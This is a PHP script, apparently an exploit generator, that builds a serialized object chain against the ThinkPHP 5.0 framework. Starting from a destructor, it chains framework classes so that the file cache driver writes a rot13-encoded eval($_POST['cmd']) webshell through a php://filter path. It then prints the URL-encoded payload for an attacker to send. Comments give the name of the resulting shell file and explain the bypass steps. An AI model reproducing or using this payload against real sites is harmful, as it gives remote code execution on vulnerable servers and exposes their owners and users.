<?php
namespace think\cache;
abstract class Driver{
}

// __call
namespace think\cache\driver;
use think\cache\driver\File;
use think\cache\Driver;
class Memcached extends Driver{
    protected $handler;
    protected $tag;
    function __construct(){
        $this->handler = new File(); 
        $this->tag = 'ke';
        //shell名 md5("tag_".md5('ke')).php
    }
}

namespace think\session\driver;
use think\cache\driver\Memcached;
class Memcache{
 protected $handler = null; 
 protected $config  = [
    'expire'       => 0, 
        'session_name' => '<?cuc riny($_CBFG["pzq"]);?>', // 在这里赋值一句话 eval($_POST["cmd"]);
    ];
     public function __construct()
    {
        $this->handler= new Memcached(); //不直接赋值为File() ,而是赋值为 Memcached 绕一下
    }
}


namespace think\cache\driver;
use think\cache\Driver;
class File extends Driver{
    //下面的这些键名即使键值为''，也要加上，不然会出现index错误
    protected $options = [
        'expire'  =>'',
        'prefix'        => '',
        'cache_subdir' =>'' ,
        'path'         => 'php://filter/write=string.rot13/resource=',  //赋值去掉之前的<>和?
        'data_compress' => '',   
    ];
    protected $tag = '123';
    protected $expire = 0 ;

}



// __toString

namespace think\console;
use think\session\driver\Memcache;
class Output{
    protected $styles = ['getAttr'];
    protected $handle;
    function __construct(){
        $this->handle = new Memcache();
    }
}

namespace think\model;
use think\db\Query;
abstract class Relation
{
    protected $selfRelation = 0;
    protected $model;

}
namespace think\model\relation;
use think\model\Relation;
use think\db\Query;
use think\console\Output;
abstract class OneToOne extends Relation{
    protected $bindAttr;
    protected $query;
    function __construct(){
        $this->bindAttr = ['a'=>'args'];  //args 自定义
        $this->query = new Query();
        $this->model = get_class(new Output());
    }
}
use think\model\relation\OneToOne;
class HasOne extends OneToOne{
}

namespace think\db;
use think\console\Output; //-------------
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();   //这里就是要new 的对象和下面parent 中的相同,其实 Output类
    }
}

namespace think;
use think\model\relation\HasOne;
use think\console\Output;  //-----------
abstract class Model
{
    protected $append = ['getError'];
    protected $error ;
    protected $parent;
    
    function __construct(){
        $this->error = new HasOne();
        $this->parent = new Output();  //这里就是要new 的对象和上面的model 中的相同,其实使Output类
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model{
}


// __destruct
namespace think\process\pipes;
use think\model\Pivot;
class Windows {
    private $files = [];
    public function __construct() {
        $this->files=[new Pivot()];
    }
}

$x=new Windows();
echo str_replace('+', '%20', urlencode(serialize($x)));